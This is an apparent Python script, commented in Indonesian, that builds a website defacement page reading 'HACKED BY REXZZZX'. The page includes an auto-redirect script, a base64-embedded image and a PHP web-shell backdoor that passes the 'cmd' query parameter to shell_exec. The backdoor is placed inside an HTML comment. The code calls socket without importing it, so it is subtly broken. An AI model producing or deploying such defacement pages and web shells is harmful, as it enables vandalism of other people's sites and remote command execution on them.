#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import random
import base64
from datetime import datetime

# ██████ WARNA TERMUX ██████
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RAINBOW = [RED, YELLOW, GREEN, CYAN, BLUE, PURPLE]
    RESET = '\033[0m'

# ░▒▓█►◄ PAYLOAD MEGA SPESIAL ◄►█▓▒░
class DefacePayload:
    def __init__(self):
        self.author = "REXZZZX"
        self.team = "CRASHER V2 TEAM"
        self.version = "ULTRA-MAX"
        self.symbols = "✧✦✯✰⚡🔥★☆✪☠☣☢❂♛⚔️☠️🎯💀👑🖥️🔫🌐💣"
        
    def generate_rainbow_text(self, text):
        colored_text = ""
        for i, char in enumerate(text):
            color = Colors.RAINBOW[i % len(Colors.RAINBOW)]
            colored_text += f"{color}{char}"
        return colored_text + Colors.RESET

    def create_epic_payload(self):
        # ▄▀▄▀▄ BASE64 IMAGE EMBED ▄▀▄▀▄
        with open("firefruit.png", "rb") as img_file:
            img_base64 = base64.b64encode(img_file.read()).decode('utf-8')
        
        # ✧✧✧ ANIMASI CSS ✧✧✧
        css_animation = """
        @keyframes blink {
            0% { opacity: 0; }
            50% { opacity: 1; }
            100% { opacity: 0; }
        }
        .hacked { animation: blink 0.5s infinite; }
        """
        
        # ✦✦✦ AUTO-REDIRECT SCRIPT ✦✦✦
        redirect_script = """
        <script>
            setTimeout(function(){
                window.location.href = "https://github.com/rexxu958";
            }, 5000);
        </script>
        """
        
        # ✯✯✯ BACKDOOR PHP ✯✯✯
        php_backdoor = """
        <?php 
        if(isset($_GET['cmd'])) {
            echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
        }
        ?>
        """
        
        # ✰✰✰ PAYLOAD UTAMA ✰✰✰
        payload = f"""
<!DOCTYPE html>
<html>
<head>
    <title>☠️ HACKED BY {self.author} ☠️</title>
    <style>
        body {{
            background: #000;
            color: #f00;
            font-family: 'Courier New', monospace;
            text-align: center;
            margin: 0;
            padding: 0;
            overflow: hidden;
            {css_animation}
        }}
        .header {{
            font-size: 3em;
            text-shadow: 0 0 10px #fff, 0 0 20px #f00;
            margin-top: 50px;
        }}
        .symbol {{
            font-size: 2em;
            margin: 20px 0;
        }}
        img {{
            max-width: 500px;
            border: 5px solid #f00;
            box-shadow: 0 0 30px #f00;
        }}
        .rainbow {{
            background: linear-gradient(to right, #ff0000, #ff9900, #33cc33, #3399ff, #cc33ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: bold;
        }}
    </style>
    {redirect_script}
</head>
<body>
    <div class="symbol">{self.generate_rainbow_text('✦✧✦✧✦✧✦✧✦✧✦✧✦✧✦✧✦✧✦')}</div>
    
    <h1 class="header hacked">☠️ HACKED BY {self.author} ☠️</h1>
    
    <div class="symbol">{self.generate_rainbow_text('✯✰⚡🔥★☆✪☠☣☢❂♛⚔️')}</div>
    
    <p style="font-size: 1.5em;" class="rainbow">
        WE ARE {self.team} | VERSION: {self.version}
    </p>
    
    <img src="data:image/png;base64,{img_base64}" alt="HIDDEN FIREFRUIT">
    
    <div class="symbol">{self.generate_rainbow_text('▄▀▄▀▄ YOUR SECURITY IS WEAK ▄▀▄▀▄')}</div>
    
    <p style="font-size: 1.2em;">
        {datetime.now().strftime("%Y-%m-%d %H:%M:%S")} | {socket.gethostname()}
    </p>
    
    <div style="position: fixed; bottom: 0; width: 100%; background: #111; padding: 10px;">
        {self.generate_rainbow_text('⚠️ WARNING: System Compromised ⚠️')}
    </div>
    
    <!-- HIDDEN BACKDOOR -->
    <!-- {php_backdoor} -->
</body>
</html>
        """
        return payload

# ░▒▓█►◄ MAIN MENU ◄►█▓▒░
def main():
    os.system("clear")
    print(f"""
{Colors.RED}╔═╗╔═╗╔═╗╔═╗╔═╗╔═╗  ╔═╗╦═╗╔═╗╔═╗╔═╗╦ ╦
{Colors.YELLOW}╠═╝╠═╣║ ║║ ║╚═╗║╣   ║ ║╠╦╝╠═╣║  ║ ║╚╦╝
{Colors.GREEN}╩  ╩ ╩╚═╝╚═╝╚═╝╚═╝  ╚═╝╩╚═╩ ╩╚═╝╚═╝ ╩ 
{Colors.RESET}""")
    
    dp = DefacePayload()
    payload = dp.create_epic_payload()
    
    print(f"{Colors.CYAN}[+] Payload Deface Telah Dibuat!{Colors.RESET}")
    print(f"{Colors.PURPLE}↳ Ukuran: {len(payload)} bytes{Colors.RESET}")
    
    with open("deface.html", "w") as f:
        f.write(payload)
    
    print(f"\n{Colors.GREEN}File disimpan sebagai: deface.html{Colors.RESET}")
    print(f"{Colors.RAINBOW[2]}Gunakan dengan bijak!{Colors.RESET}")

if __name__ == "__main__":
    main()
